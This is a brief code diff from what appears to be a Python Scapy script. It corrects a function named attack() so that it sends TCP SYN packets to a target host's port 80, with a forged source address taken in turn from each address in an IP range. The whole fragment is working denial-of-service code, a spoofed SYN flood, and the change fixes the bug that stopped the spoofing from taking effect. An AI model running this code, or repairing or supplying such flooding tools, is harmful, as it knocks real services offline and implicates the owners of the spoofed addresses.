@@ -28,8 +28,8 @@ def attack():
     for ip in ip_network:
         print(ip.__str__())
         p = IP()
-        ip.src = ip.__str__()
-        ip.dst = host
+        p.src = ip.__str__()
+        p.dst = host
 
         t = TCP(dport=80, flags="S")
         send(p / t)
